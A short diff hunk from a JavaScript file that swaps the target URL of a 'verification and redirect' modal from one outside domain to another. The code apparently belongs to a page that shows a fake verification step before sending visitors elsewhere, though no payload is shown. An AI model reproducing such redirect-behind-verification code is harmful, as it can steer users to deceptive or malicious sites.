@@ -50,7 +50,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const modalContent = document.getElementById('modal-content');
     const modalLoading = document.getElementById('modal-loading');
     const modalVerified = document.getElementById('modal-verified');
-    const targetUrl = 'https://trafficedge.site'; // Define the target URL once
+    const targetUrl = 'https://apexsphere.online/'; // Define the target URL once
 
     const handleVerificationAndRedirect = (e) => {
       if (e) e.preventDefault();
